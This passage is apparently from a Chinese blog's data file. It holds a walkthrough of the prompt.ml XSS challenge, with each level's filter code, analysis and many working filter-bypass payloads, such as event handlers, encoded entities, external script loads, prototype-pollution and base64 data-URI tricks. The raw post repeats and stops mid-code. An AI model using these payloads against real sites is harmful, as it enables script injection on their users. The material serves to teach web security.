里面所有的表<br>information_schema.tables</li>\n<li>系统函数<br>介绍几个常用函数：</li>\n<li><ol>\n<li>version()——MySQL 版本</li>\n<li>user()——数据库用户名</li>\n<li>database()——数据库名</li>\n<li>@@datadir——数据库路径</li>\n<li>@@version_compile_os——操作系统版本</li>\n</ol>\n</li>\n</ul>\n"},{"title":"prompt-xss笔记","date":"2018-10-11T01:12:00.000Z","_content":"\n# prompt-xss笔记\n\n在线xss题目,用于xss学习,弹出prompt(1)就过关.\n\n地址:http://prompt.ml\n\n文档: https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml\n\n我使用的是firefox浏览器,不同的浏览器有时会有些差异。\n\n# Level 0\n\n## Code:\n\n```\nfunction escape(input) {\n    // warm up\n    // script should be executed without user interaction\n    return '<input type=\"text\" value=\"' + input + '\">';\n} \n```\n\n## 分析:\n\n没有过滤,需要构造闭合。\n官方文档的答案是`\"><svg  onload=prompt(1)>`,利用了svg标签的onload事件，\n而onload 事件会在页面或图像加载完成后立即发生。\n\n## Solutions:\n\n```\n1. \"><script>prompt(1)</script>\n\n2. \"><svg onload=prompt(1)>\n\n3. 利用外联方式 \n\"><script src=\"http://10.60.250.250/pro.js\"></script>\n\n4. 利用onerror事件,当src寻找的资源不存在发送错误弹框。\n\"><img src='' onerror='prompt(1)'>\n\n5. 利用html的字符实体和SVG。\n    SVG意为可缩放矢量图形（Scalable Vector Graphics）。\n    SVG 使用 XML 格式定义图像。\n   \"><svg><script>prompt&#x28;1&#x29;</script></svg>\n\n6. 利用编码\n\t\"><img src=\"x\" onerror=\"&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;&#x28;&#x31;&#x29;\"\n>\n\n```\n\n## Img:\n\n1. `\"><script>prompt(1)</script>`\n\n![0_1](/img/xss/prompt_ml/level0_001.png)\n\n2. `\"><svg onload=prompt(1)>`\n   \n![0_2](/img/xss/prompt_ml/level0_002.png)\n\n3. `\"><script src=\"http://10.60.250.250/pro.js\"></script>`\n   \n![0_3](/img/xss/prompt_ml/level0_003.png)\n\n4. `\"><img src='' onerror='prompt(1)'>`\n   \n![0_4](/img/xss/prompt_ml/level0_004.png)\n\n5. `\"><svg><script>prompt&#x28;1&#x29;</script></svg>`\n   \n![0_5](/img/xss/prompt_ml/level0_005.png)\n\n6. `\"\"><img src=\"x\" onerror=\"&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;&#x28;&#x31;&#x29;\">`\n\n![0_6](/img/xss/prompt_ml/level0_006.png)\n\n\n# Level 1\n\n## Code:\n\n```\nfunction escape(input) {\n    // tags stripping mechanism from ExtJS library\n    // Ext.util.Format.stripTags\n    var stripTagsRE = /<\\/?[^>]+>/gi;\n    input = input.replace(stripTagsRE, '');\n\n    return '<article>' + input + '</article>';\n}        \n```\n\n## 分析:\n\n过滤了`<>`,只要用`<>`闭合就将`<xx>`全部替换为空。\n\n可以去掉`>`来绕过，浏览器在处理没有右尖括号的标签时有兼容性，没有`>`的标签也能生效。（注意这时候后边不能有内容)。\n\n可以用//注释或换行分开`</article>`\n\n官方答案是`<svg/onload=prompt(1) `,其实和`<svg onload=prompt(1) `相同。\n\n## Solutions:\n\n```\n1. \n<img src=# onerror=prompt(1)\n123 //(这里的123是为了使img生效)\n\n2. <svg/onload=prompt(1)// (利用注释过掉</article>)\n\t或\n\t<svg onload=prompt(1)//\n\n3. 利用onerror事件,当src寻找的资源不存在发送错误弹框。\n\t<img src='' onerror='prompt(1)'\n\n```\n\n## Img:\n\n1. \n```\n<img src=# onerror=prompt(1)\n123 \n```\n![1_1](/img/xss/prompt_ml/level1_001.png)\n\n2. `<svg/onload=prompt(1)//`\n![1_2](/img/xss/prompt_ml/level1_002.png)\n\n3.  `<img src='' onerror='prompt(1)'`或`<img src='' onerror='prompt(1)' /`或`<img src='' onerror='prompt(1)' //`\n    \n![1_3](/img/xss/prompt_ml/level1_003.png)\n\n# Level 2\n\n## Code:\n\n```\nfunction escape(input) {\n    //                      v-- frowny face\n    input = input.replace(/[=(]/g, '');\n\n    // ok seriously, disallows equal signs and open parenthesis\n    return input;\n}           \n```\n\n## 分析:\n\n```\n过滤了`=`和`)`\n尝试使用编码或其他方式绕过\n```\n\n\n\n## Solutions:\n\n```\n1.使用html编码,&#x28;或&lpar;替代(\n<svg><script>prompt&#x28;1)</script>\n<svg><script>prompt&lpar;1)</script>\n官方答案是`<svg><script>prompt&#40;1)<b>`,缩短了字符。用的是&#40是10进制的。\n\n2. 官方答案:\n\t<script>eval.call`${'prompt\\x281)'}`</script>\n\n3. 官方答案:\n\t<script>prompt.call`${1}`</script>\n\n```\n\n## Img:\n\n1. \n\n`<svg><script>prompt&#x28;1)</script>`\n\n![2_1](/img/xss/prompt_ml/level2_001.png)\n\n2.  \n``<script>eval.call`${'prompt\\x281)'}`</script>``\n\n ![2_2](/img/xss/prompt_ml/level2_002.png)\n\n3. ``<script>prompt.call`${1}`</script>``\n     ![2_3](/img/xss/prompt_ml/level2_003.png)\n\n# Level 3\n\n## Code:\n\n```\nfunction escape(input) {\n    // filter potential comment end delimiters\n    input = input.replace(/->/g, '_');\n\n    // comment the input to avoid script execution\n    return '<!-- ' + input + ' -->';\n}        \n```\n\n## 分析:\n\n```\n过滤了->并替换成_\n但是除了-->可以闭合注释，--!>也可以。\n```\n\n\n\n## Solutions:\n\n```\n1.--!><svg/ onload=prompt(1)>\n\n2. 官方答案:\n\t<script>eval.call`${'prompt\\x281)'}`</script>\n\n3. 官方答案:\n\t<script>prompt.call`${1}`</script>\n\n```\n\n## Img:\n\n1. `--!><svg/ onload=prompt(1)>`\n\n![3_1](/img/xss/prompt_ml/level3_001.png)\n\n# Level 4\n\n## Code:\n\n```\nfunction escape(input) {\n    // make sure the script belongs to own site\n    // sample script: http://prompt.ml/js/test.js\n    if (/^(?:https?:)?\\/\\/prompt\\.ml\\//i.test(decodeURIComponent(input))) {\n        var script = document.createElement('script');\n        script.src = input;\n        return script.outerHTML;\n    } else {\n        return 'Invalid resource.';\n    }\n}              \n```\n\n## 分析:\n\n```\n只能匹配http://prompt.ml/或//prompt.ml/下网址,可以利用@绕过访问从而其他域名。\n这里需要把它的/用url编码%2f,@后的ip填写我php环境搭建的地址,其中的pro.js文件内\n填写prompt(1)即可。\n最终payload为：http://prompt.ml%2f@10.60.250.250/pro.js\n\n```\n\n\n\n## Solutions:\n\n```\n1.http://prompt.ml%2f@10.60.250.250/pro.js\n```\n\n## Img:\n\n1. `http://prompt.ml%2f@10.60.250.250/pro.js`\n\n![4_1](/img/xss/prompt_ml/level4_001.png)\n\n# Level 5\n\n## Code:\n\n```\nfunction escape(input) {\n    // apply strict filter rules of level 0\n    // filter \">\" and event handlers\n    input = input.replace(/>|on.+?=|focus/gi, '_');\n\n    return '<input value=\"' + input + '\" type=\"text\">';\n}     \n```\n\n## 分析:\n\n```\n将> onXXX= focus替代为了_ (其中XXX代表任意字符)\n过滤>的目的是为了防止>构造闭合。\n过滤onXXX=是为了过滤on开头的事件。\n过滤focus是为了过滤focus事件\n对于<input value=\"\" type=\"text\">中type和value的顺序,能够利用img\n```\n\n\n\n## Solutions:\n\n```\n1.用换行绕过onXXX=\n\" type='image' src=''  onerror\n=\"prompt(1)\n\n```\n\n## Img:\n\n1.\n\n```\n\" type='image' src=''  onerror\n=\"prompt(1)\n```\n\n![5_1](/img/xss/prompt_ml/level5_001.png)\n\n# Level 6\n\n## Code:\n\n```\nfunction escape(input) {\n    // let's do a post redirection\n    try {\n        // pass in formURL#formDataJSON\n        // e.g. http://httpbin.org/post#{\"name\":\"Matt\"}\n        var segments = input.split('#');\n        var formURL = segments[0];\n        var formData = JSON.parse(segments[1]);\n\n        var form = document.createElement('form');\n        form.action = formURL;\n        form.method = 'post';\n\n        for (var i in formData) {\n            var input = form.appendChild(document.createElement('input'));\n            input.name = i;\n            input.setAttribute('value', formData[i]);\n        }\n\n        return form.outerHTML + '                         \\n\\\n    <script>                                                  \\n\\\n        // forbid javascript: or vbscript: and data: stuff    \\n\\\n        if (!/script:|data:/i.test(document.forms[0].action)) \\n\\\n            document.forms[0].submit();                       \\n\\\n        else                                                  \\n\\\n            document.write(\"Action forbidden.\")               \\n\\\n    </script>                                                 \\n\\\n        ';\n    } catch (e) {\n        return 'Invalid form data.';\n    }\n} \n```\n\n## 分析:\n\n```\n以http://httpbin.org/post#{\"name\":\"Matt\"}为例\n用#分成两部分http://httpbin.org/post和{\"name\":\"Matt\"}\n将http://httpbin.org/post放入表单的action\n{\"name\":\"Matt\"}的name放入input的name属性,value=Matt\n如下：\n<form action=\"http://httpbin.org/post\" method=\"post\"><input name=\"name\" value=\"Matt\"></form>\n之后检查http://httpbin.org/post中是否有script:或者data:\n检查到就报错,没有就提交,目的是禁止使用类似下面的javascript，vbscript和data\njavascript:alert(1)//\nvbscript:alert(1);\ndata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\n```\n\n这一课比较抽象,看下答案`javascript:prompt(1)#{\"action\":1}`后做了下实验,通过将input中的name属性设action,能将\n\nform表单中的action替换成input的。因为input的action为[object HTMLInputElement],所以\n\nif (!/script:|data:/i.test(document.forms[0].action))就匹配不到,返回False后经过！为真,成功绕过。\n\n![6_1](/img/xss/prompt_ml/level6_001.png)\n\n![6_2](/img/xss/prompt_ml/level6_002.png)\n\n## Solutions:\n\n```\n1.javascript:prompt(1)#{\"action\":1}\n\n```\n\n## Img:\n\n1. `javascript:prompt(1)#{\"action\":1}`\n\t![6_3](/img/xss/prompt_ml/level6_003.png)\n\n# Level 7\n\n## Code:\n\n```\nfunction escape(input) {\n    // pass in something like dog#cat#bird#mouse...\n    var segments = input.split('#');\n    return segments.map(function(title) {\n        // title can only contain 12 characters\n        return '<p class=\"comment\" title=\"' + title.slice(0, 12) + '\"></p>';\n    }).join('\\n');\n}                 \n```\n\n## 分析:\n\n通过split将字符串分割成数组,再通过数组的map方法能创建新的数组,新数组格式加工成了\n\n`<p class=\"comment\" title=\"最长只有12字符的内容\"></p>`\n\nslice(0,12):取前12个字符。\n\n来张图体会一下\n\n![7_1](/img/xss/prompt_ml/level7_001.png)\n\n能修改的内容就是tittle处了,#来分割的新数组。\n\n可以利用多行注释来打通,注意到一段只有12个字符,要简洁。\n\n考虑到最短要使用到`<svg/onload=prompt(1)`的变形。\n\n## Solutions:\n\n1. \n`\"><svg/a='#'onload='/*#*/prompt(1)'`\n官方答案短一个字符...\n`\"><svg/a=#\"onload='/*#*/prompt(1)'`\n\n2. 利用eval函数特性执行拼接内容\n`\"><script>/*#*/a='prom'/*#*/+'pt(1)'/*#*/eval(a)/*#*/</script>`\n\n3. 利用换行\n\n```\n    \"><script>/*#*/prompt(/*#*/1)/*#*/</script>\n    1234\n```\n\n4. ``\"><script>`#${prompt(1)}#`</script>``\n\n\n## Img:\n\n1. `\"><svg/a='#'onload='/*#*/prompt(1)'`\n\n![7_2](/img/xss/prompt_ml/level7_002.png)\n\n2. `\"><script>/*#*/a='prom'/*#*/+'pt(1)'/*#*/eval(a)/*#*/</script>`\n\n![7_3](/img/xss/prompt_ml/level7_003.png)\n\n3. 1234是为了换行\n\n```\n\"><script>/*#*/prompt(/*#*/1)/*#*/</script>\n1234\n```\n\n![7_4](/img/xss/prompt_ml/level7_004.png)\n\n4. ``\"><script>`#${prompt(1)}#`</script>``\n\n![7_5](/img/xss/prompt_ml/level7_005.png)\n\n# Level 8\n\n## Code:\n\n```\nfunction escape(input) {\n    // prevent input from getting out of comment\n    // strip off line-breaks and stuff\n    input = input.replace(/[\\r\\n</\"]/g, '');\n\n    return '                                \\n\\\n    <script>                                    \\n\\\n        // console.log(\"' + input + '\");        \\n\\\n    </script> ';\n    }                    \n```\n\n## 分析:\n\n```\n过滤了换行 < /,解决这题需要绕过换行。\n官方给的答案是：\n[U+2028]prompt(1)[U+2028]-->\n这里很多人的都没成功，我在firefox下也没成功,不过chrome是可以的。\nprompt(1)-->\n```\n[U+2028]特殊字符在这复制：https://unicode-table.com/en/#2028\n\n<html><b>&#8232;prompt(1)&#8232;&#x2d;&#x2d;></b></html>\n\n![8_1](/img/xss/prompt_ml/level8_001.png)\n\n## Solutions:\n\n仅对chrome有用,firefox不行\n<html><b>&#8232;prompt(1)&#8232;&#x2d;&#x2d;></b></html>\n\n## Img:\n\n1.  \n![8_2](/img/xss/prompt_ml/level8_002.png)\n\n# Level 9\n\n## Code:\n\n```\nfunction escape(input) {\n    // filter potential start-tags\n    input = input.replace(/<([a-zA-Z])/g, '<_$1');\n    // use all-caps for heading\n    input = input.toUpperCase();\n\n    // sample input: you shall not pass! => YOU SHALL NOT PASS!\n    return '<h1>' + input + '</h1>';\n}                           \n```\n\n## 分析:\n\n```\n将<XXX 替换成<_XXX (XXX表示任意字符)\n然后把小写转换成大写。\n可以引用外部文件,利用js的scrpit,src和域名的大小写不敏感绕过。再利用toUpperCase()的特性，它不仅转换英文字母，也转换一些Unicode字符，比如将ſ传入就可以转换为S。\n```\n\n\n\n## Solutions:\n\n```\n1. \n<ſcript src=\"http://192.168.75.132/pro.js\"></script>\n这是我本地phpstudy下的pro.js文件,内容只有prompt(1)。\n```\n\n## Img:\n\n![9_1](/img/xss/prompt_ml/level9_001.png)\n\n1. `<ſcript src=\"http://192.168.75.132/pro.js\"></script>`\n\n![9_2](/img/xss/prompt_ml/level9_002.png)\n\n\n\n# Level A\n\n## Code:\n\n```\nfunction escape(input) {\n    // (╯°□°）╯︵ ┻━┻\n    input = encodeURIComponent(input).replace(/prompt/g, 'alert');\n    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro\n    input = input.replace(/'/g, '');\n\n    // (╯°□°）╯︵ /(.□. \\）DONT FLIP ME BRO\n    return '<script>' + input + '</script> ';\n}                          \n```\n\n## 分析:\n\n```\nencodeURIComponent() 函数可把字符串作为 URI 组件进行编码。该方法不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ' ( ) 。\n而接下来又将‘消除,传如promp't\n```\n\n\n\n## Solutions:\n\n```\n1. \npromp't(1)\n```\n\n## Img:\n\n1. `promp't(1)`\n\n![A_1](/img/xss/prompt_ml/levelA_001.png)\n\n# Level B\n\n## Code:\n\n```\nfunction escape(input) {\n    // name should not contain special characters\n    var memberName = input.replace(/[[|\\s+*/\\\\<>&^:;=~!%-]/g, '');\n\n    // data to be parsed as JSON\n    var dataString = '{\"action\":\"login\",\"message\":\"Welcome back, ' + memberName + '.\"}';\n\n    // directly \"parse\" data in script context\n    return '                                \\n\\\n    <script>                                    \\n\\\n        var data = ' + dataString + ';          \\n\\\n        if (data.action === \"login\")            \\n\\\n            document.write(data.message)        \\n\\\n    </script> ';\n}                         \n\n```\n\n## 分析:\n\n```\n将以下符号消除\n[ | 空白符 + * \\ < > & ^ : ; = ~ ! % - \n```\n\n\n\n## Solutions:\n\n```\n1. 测试时发现json对象的名称相同时会取最右的值,但是这里过滤了：,有什么办法绕过呢。\n官方答案是:\"(prompt(1))in\"\nin是js的关系操作符\n这个会发生js错误，但是能执行prompt(1)\n\n同样答案也可是：\"(prompt(1))instanceof\"\n```\n\n\n\n![B_1](/img/xss/prompt_ml/levelB_001.png)\n\n## Img:\n\n1. `\"(prompt(1))in\"`\n\n   ![B_2](/img/xss/prompt_ml/levelB_002.png)\n\n2. `\"(prompt(1))instanceof\"`\n\n   ![B_3](/img/xss/prompt_ml/levelB_003.png)\n\n\n\n# Level C\n\n## Code:\n\n```\nfunction escape(input) {\n    // in Soviet Russia...\n    input = encodeURIComponent(input).replace(/'/g, '');\n    // table flips you!\n    input = input.replace(/prompt/g, 'alert');\n\n    // ノ┬─┬ノ ︵ ( \\o°o)\\\n    return '<script>' + input + '</script> ';\n}  \n```\n\n## 分析:\n\n```\nencodeURIComponent() 函数可把字符串作为 URI 组件进行编码。该方法不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ' ( ) 。\n\n这里只能利用编码了\n参考答案利用parseInt(字符串,基数)函数将字符串转换成整数,用指定基数表示。\nparseInt(\"prompt\",36); //1558153217\n然后又用toString转化回来,用concat函数拼接编码的(1)\n参考答案:\neval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))\n \n```\n\n\n\n## Solutions:\n\n```\n1.eval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))\n\n2. 参考答案的简化版,因为没有对(1)过滤\neval((630038579).toString(30))(1)\n```\n\n\n\n\n\n## Img:\n\n1. `eval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))`\n\n![C_1](/img/xss/prompt_ml/levelC_001.png)\n\n2.  `eval((630038579).toString(30))(1)`\n\n![C_2](/img/xss/prompt_ml/levelC_002.png)\n\n\n\n# Level D\n\n## Code:\n\n```\nfunction escape(input) {\n    // extend method from Underscore library\n    // _.extend(destination, *sources) \n    function extend(obj) {\n        var source, prop;\n        for (var i = 1, length = arguments.length; i < length; i++) {\n            source = arguments[i];\n            for (prop in source) {\n                obj[prop] = source[prop];\n            }\n        }\n        return obj;\n    }\n    // a simple picture plugin\n    try {\n        // pass in something like {\"source\":\"http://sandbox.prompt.ml/PROMPT.JPG\"}\n        var data = JSON.parse(input);\n        var config = extend({\n            // default image source\n            source: 'http://placehold.it/350x150'\n        }, JSON.parse(input));\n        // forbit invalid image source\n        if (/[^\\w:\\/.]/.test(config.source)) {\n            delete config.source;\n        }\n        // purify the source by stripping off \"\n        var source = config.source.replace(/\"/g, '');\n        // insert the content using mustache-ish template\n        return '<img src=\"{{source}}\">'.replace('{{source}}', source);\n    } catch (e) {\n        return 'Invalid image data.';\n    }\n}        function escape(input) {\n    // in Soviet Russia...\n    input = encodeURIComponent(input).replace(/'/g, '');\n    // table flips you!\n    input = input.replace(/prompt/g, 'alert');\n\n    // ノ┬─┬ノ ︵ ( \\o°o)\\\n    return '<script>' + input + '</script> ';\n}  \n```\n\n## 分析:\n\n```\n//input参数是这里进入的\ntry {\n        // 举例输入的参数 {\"source\":\"http://sandbox.prompt.ml/PROMPT.JPG\"}\n        //将input字符串转换成js数据\n        var data = JSON.parse(input);\n        获得定死的source\n        var config = extend({\n            // default image source\n            source: 'http://placehold.it/350x150'\n        }, JSON.parse(input));\n        // 如果存在 字母数字下划线 / . 以外的就删除sourse \n        if (/[^\\w:\\/.]/.test(config.source)) {\n            delete config.source;\n        }\n        消除 \"\n        var source = config.source.replace(/\"/g, '');\n        // 插入sourse\n        return '<img src=\"{{source}}\">'.replace('{{source}}', source);\n    } catch (e) {\n        return 'Invalid image data.';\n    }\n}  \n```\n\n这题的绕过需要`Object.prototype.__proto__`这个属性，这个属性已经不被建议用在实际代码中。\n\n看下面的例子是如何利用的。\n\n![D_1](/img/xss/prompt_ml/levelD_001.png)\n\n当原来的值被删除时,可以用`__proto__`属性来赋值。可以构造形如\n\n`{\"source\":\"*\",\"__proto__\":{\"source\":\"\"onerror=prompt(1)>\"}}`来使原来的sources失效,而使用自己写入的来突破。\n\n但是第二次过滤的时候消除了`”`，想办法找个替代双引号的方法。\n\n这里的技巧为`String.prototype.replace()`支持特殊的`pattern`:\n\n![D_2](/img/xss/prompt_ml/levelD_002.png)\n\nreplace中使用$`会将变量的前部插入。\n\n在这里就是`<img src=\"`，借用这个虽然playad结构改变,但是绕过了`\"`\n\n## Solutions:\n\n```\n1.{\"source\":\"*\",\"__proto__\":{\"source\":\"$`onerror=prompt(1)>\"}}\n```\n\n\n\n\n\n## Img:\n\n1.\n\n```\n{\"source\":\"*\",\"__proto__\":{\"source\":\"$`onerror=prompt(1)>\"}}\n```\n\n![D_3](/img/xss/prompt_ml/levelD_003.png)\n\n# Level E\n\n## Code:\n\n```\nfunction escape(input) {\n    // I expect this one will have other solutions, so be creative :)\n    // mspaint makes all file names in all-caps :(\n    // too lazy to convert them back in lower case\n    // sample input: prompt.jpg => PROMPT.JPG\n    input = input.toUpperCase();\n    // only allows images loaded from own host or data URI scheme\n    input = input.replace(/\\/\\/|\\w+:/g, 'data:');\n    // miscellaneous filtering\n    input = input.replace(/[\\\\&+%\\s]|vbs/gi, '_');\n\n    return '<img src=\"' + input + '\">';\n}        \n```\n\n## 分析:\n\n```\n第一层：转成大写\n第二层：把// xxx:转成data(xxx表示任意字母)\n第三层：过滤了\\ & + % 空白符 和vbs\n由于转换了大写,html的标签无法使用了,这时候考虑引用外部的js文件。\n由于引用外部的js文件势必要使用到http:或http:这样的协议,所有这条路被封死了。\n考虑一下data:是否能利用。\n\n \n```\n\n![E_1](/img/xss/prompt_ml/levelE_001.png)\n\n因为经过大写转换,就只能利用base64编码的写法了。\n\n`<IFRAME/SRC=\"data:TEXT/HTML;BASE64,PHNJCMLWDD5WCM9TCHQOMSK8L3NJCMLWDD4=\">`\n\n`PHNJCMLWDD5WCM9TCHQOMSK8L3NJCMLWDD4=`是`<script>prompt(1)</script>`经过base64编码再改大写的。\n\n## Solutions:\n\n```\n1. \"><iframe/src=\"data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=\n```\n\n## Img:\n\n这题在环境下没有成功,但是在本地测试下是可行的。\n\n![E_2](/img/xss/prompt_ml/levelE_002.png)\n\n# Level F\n\n## Code:\n\n```\nfunction escape(input) {\n    // sort of spoiler of level 7\n    input = input.replace(/\\*/g, '');\n    // pass in something like dog#cat#bird#mouse...\n    var segments = input.split('#');\n\n    return segments.map(function(title, index) {\n        // title can only contain 15 characters\n        return '<p class=\"comment\" title=\"' + title.slice(0, 15) + '\" data-comment=\\'{\"id\":' + index + '}\\'></p>';\n    }).join('\\n');\n}   \n```\n\n## 分析:\n\n这一课和Level7的很类似。解决的思路是一样的,这里最大长度为15个字符,可以使用<!--多行注释。\n\n## Solutions:\n\n1. \n   `\"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>`\n   经过测试firfox下面也可以\n   `\"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</`\n\n2. \n\n``\"><script>`#${prompt(1)}#`</script>``\n\n\n3. 利用eval函数特性执行拼接内容\n\n`\"><script>/*#*/a='prom'/*#*/+'pt(1)'/*#*/eval(a)/*#*/</script>`\n\n\n## Img:\n\n1. `\"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</`\n\n![F_1](/img/xss/prompt_ml/levelF_001.png)\n\n2. ``\"><script>`#${prompt(1)}#`</script>``\n\n![F_2](/img/xss/prompt_ml/levelF_002.png)\n\n\n","source":"_posts/prompt-xss笔记.md","raw":"---\ntitle: prompt-xss笔记\ndate: 2018-10-11 09:12:00\ntags: XSS\ncategories: XSS\n---\n\n# prompt-xss笔记\n\n在线xss题目,用于xss学习,弹出prompt(1)就过关.\n\n地址:http://prompt.ml\n\n文档: https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml\n\n我使用的是firefox浏览器,不同的浏览器有时会有些差异。\n\n# Level 0\n\n## Code:\n\n```\nfunction escape(input) {\n    // warm up\n    // script should be executed without user interaction\n    return '<input type=\"text\" value=\"' + input + '\">';\n} \n```\n\n## 分析:\n\n没有过滤,需要构造闭合。\n官方文档的答案是`\"><svg  onload=prompt(1)>`,利用了svg标签的onload事件，\n而onload 事件会在页面或图像加载完成后立即发生。\n\n## Solutions:\n\n```\n1. \"><script>prompt(1)</script>\n\n2. \"><svg onload=prompt(1)>\n\n3. 利用外联方式 \n\"><script src=\"http://10.60.250.250/pro.js\"></script>\n\n4. 利用onerror事件,当src寻找的资源不存在发送错误弹框。\n\"><img src='' onerror='prompt(1)'>\n\n5. 利用html的字符实体和SVG。\n    SVG意为可缩放矢量图形（Scalable Vector Graphics）。\n    SVG 使用 XML 格式定义图像。\n   \"><svg><script>prompt&#x28;1&#x29;</script></svg>\n\n6. 利用编码\n\t\"><img src=\"x\" onerror=\"&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;&#x28;&#x31;&#x29;\"\n>\n\n```\n\n## Img:\n\n1. `\"><script>prompt(1)</script>`\n\n![0_1](/img/xss/prompt_ml/level0_001.png)\n\n2. `\"><svg onload=prompt(1)>`\n   \n![0_2](/img/xss/prompt_ml/level0_002.png)\n\n3. `\"><script src=\"http://10.60.250.250/pro.js\"></script>`\n   \n![0_3](/img/xss/prompt_ml/level0_003.png)\n\n4. `\"><img src='' onerror='prompt(1)'>`\n   \n![0_4](/img/xss/prompt_ml/level0_004.png)\n\n5. `\"><svg><script>prompt&#x28;1&#x29;</script></svg>`\n   \n![0_5](/img/xss/prompt_ml/level0_005.png)\n\n6. `\"\"><img src=\"x\" onerror=\"&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;&#x28;&#x31;&#x29;\">`\n\n![0_6](/img/xss/prompt_ml/level0_006.png)\n\n\n# Level 1\n\n## Code:\n\n```\nfunction escape(input) {\n    // tags stripping mechanism from ExtJS library\n    // Ext.util.Format.stripTags\n    var stripTagsRE = /<\\/?[^>]+>/gi;\n    input = input.replace(stripTagsRE, '');\n\n    return '<article>' + input + '</article>';\n}        \n```\n\n## 分析:\n\n过滤了`<>`,只要用`<>`闭合就将`<xx>`全部替换为空。\n\n可以去掉`>`来绕过，浏览器在处理没有右尖括号的标签时有兼容性，没有`>`的标签也能生效。（注意这时候后边不能有内容)。\n\n可以用//注释或换行分开`</article>`\n\n官方答案是`<svg/onload=prompt(1) `,其实和`<svg onload=prompt(1) `相同。\n\n## Solutions:\n\n```\n1. \n<img src=# onerror=prompt(1)\n123 //(这里的123是为了使img生效)\n\n2. <svg/onload=prompt(1)// (利用注释过掉</article>)\n\t或\n\t<svg onload=prompt(1)//\n\n3. 利用onerror事件,当src寻找的资源不存在发送错误弹框。\n\t<img src='' onerror='prompt(1)'\n\n```\n\n## Img:\n\n1. \n```\n<img src=# onerror=prompt(1)\n123 \n```\n![1_1](/img/xss/prompt_ml/level1_001.png)\n\n2. `<svg/onload=prompt(1)//`\n![1_2](/img/xss/prompt_ml/level1_002.png)\n\n3.  `<img src='' onerror='prompt(1)'`或`<img src='' onerror='prompt(1)' /`或`<img src='' onerror='prompt(1)' //`\n    \n![1_3](/img/xss/prompt_ml/level1_003.png)\n\n# Level 2\n\n## Code:\n\n```\nfunction escape(input) {\n    //                      v-- frowny face\n    input = input.replace(/[=(]/g, '');\n\n    // ok seriously, disallows equal signs and open parenthesis\n    return input;\n}           \n```\n\n## 分析:\n\n```\n过滤了`=`和`)`\n尝试使用编码或其他方式绕过\n```\n\n\n\n## Solutions:\n\n```\n1.使用html编码,&#x28;或&lpar;替代(\n<svg><script>prompt&#x28;1)</script>\n<svg><script>prompt&lpar;1)</script>\n官方答案是`<svg><script>prompt&#40;1)<b>`,缩短了字符。用的是&#40是10进制的。\n\n2. 官方答案:\n\t<script>eval.call`${'prompt\\x281)'}`</script>\n\n3. 官方答案:\n\t<script>prompt.call`${1}`</script>\n\n```\n\n## Img:\n\n1. \n\n`<svg><script>prompt&#x28;1)</script>`\n\n![2_1](/img/xss/prompt_ml/level2_001.png)\n\n2.  \n``<script>eval.call`${'prompt\\x281)'}`</script>``\n\n ![2_2](/img/xss/prompt_ml/level2_002.png)\n\n3. ``<script>prompt.call`${1}`</script>``\n     ![2_3](/img/xss/prompt_ml/level2_003.png)\n\n# Level 3\n\n## Code:\n\n```\nfunction escape(input) {\n    // filter potential comment end delimiters\n    input = input.replace(/->/g, '_');\n\n    // comment the input to avoid script execution\n    return '<!-- ' + input + ' -->';\n}        \n```\n\n## 分析:\n\n```\n过滤了->并替换成_\n但是除了-->可以闭合注释，--!>也可以。\n```\n\n\n\n## Solutions:\n\n```\n1.--!><svg/ onload=prompt(1)>\n\n2. 官方答案:\n\t<script>eval.call`${'prompt\\x281)'}`</script>\n\n3. 官方答案:\n\t<script>prompt.call`${1}`</script>\n\n```\n\n## Img:\n\n1. `--!><svg/ onload=prompt(1)>`\n\n![3_1](/img/xss/prompt_ml/level3_001.png)\n\n# Level 4\n\n## Code:\n\n```\nfunction escape(input) {\n    // make sure the script belongs to own site\n    // sample script: http://prompt.ml/js/test.js\n    if (/^(?:https?:)?\\/\\/prompt\\.ml\\//i.test(decodeURIComponent(input))) {\n        var script = document.createElement('script');\n        script.src = input;\n        return script.outerHTML;\n    } else {\n        return 'Invalid resource.';\n    }\n}              \n```\n\n## 分析:\n\n```\n只能匹配http://prompt.ml/或//prompt.ml/下网址,可以利用@绕过访问从而其他域名。\n这里需要把它的/用url编码%2f,@后的ip填写我php环境搭建的地址,其中的pro.js文件内\n填写prompt(1)即可。\n最终payload为：http://prompt.ml%2f@10.60.250.250/pro.js\n\n```\n\n\n\n## Solutions:\n\n```\n1.http://prompt.ml%2f@10.60.250.250/pro.js\n```\n\n## Img:\n\n1. `http://prompt.ml%2f@10.60.250.250/pro.js`\n\n![4_1](/img/xss/prompt_ml/level4_001.png)\n\n# Level 5\n\n## Code:\n\n```\nfunction escape(input) {\n    // apply strict filter rules of level 0\n    // filter \">\" and event handlers\n    input = input.replace(/>|on.+?=|focus/gi, '_');\n\n    return '<input value=\"' + input + '\" type=\"text\">';\n}     \n```\n\n## 分析:\n\n```\n将> onXXX= focus替代为了_ (其中XXX代表任意字符)\n过滤>的目的是为了防止>构造闭合。\n过滤onXXX=是为了过滤on开头的事件。\n过滤focus是为了过滤focus事件\n对于<input value=\"\" type=\"text\">中type和value的顺序,能够利用img\n```\n\n\n\n## Solutions:\n\n```\n1.用换行绕过onXXX=\n\" type='image' src=''  onerror\n=\"prompt(1)\n\n```\n\n## Img:\n\n1.\n\n```\n\" type='image' src=''  onerror\n=\"prompt(1)\n```\n\n![5_1](/img/xss/prompt_ml/level5_001.png)\n\n# Level 6\n\n## Code:\n\n```\nfunction escape(input) {\n    // let's do a post 